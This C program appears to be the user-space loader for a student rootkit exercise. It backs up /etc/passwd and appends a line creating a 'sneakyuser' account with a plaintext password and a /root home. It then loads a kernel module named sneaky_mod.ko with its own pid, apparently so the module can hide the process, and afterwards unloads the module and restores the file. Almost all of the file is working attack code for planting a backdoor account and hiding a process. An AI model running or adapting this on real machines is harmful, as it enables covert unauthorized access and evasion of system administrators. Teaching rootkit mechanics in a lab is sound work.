#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>

int main(){
    // print its own process id to the screen
    printf("sneaky_process pid = %d\n", getpid());
    
    // move file
    int res = system("cp /etc/passwd /tmp/passwd");
    if (res == -1){
        printf("can not unload sneaky_mod.ko\n");
        exit(EXIT_FAILURE);
    }
    // add one line to the end of the file
    char *line = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
    char *file = "/etc/passwd";
    char command[100];

    snprintf(command, 100, "echo '%s' >> %s", line, file);
    res = system(command);
    if (res == -1){
        printf("can not insert one line\n");
        exit(EXIT_FAILURE);
    }
    memset(command, 0, 100);
    snprintf(command, 100, "insmod sneaky_mod.ko pid=%d", (int)getpid());
    res = system(command);
    if (res == -1){
        printf("can not load sneaky_mod.ko\n");
        exit(EXIT_FAILURE);
    }
    
    while (getchar() == 'q'){
        break;
    }
    res = system("rmmod sneaky_mod.ko");
    if (res == -1){
        printf("can not unload sneaky_mod.ko\n");
        exit(EXIT_FAILURE);
    }
    system("cp /tmp/passwd /etc/passwd");
    system("rm -f /tmp/passwd");
    return EXIT_SUCCESS;
}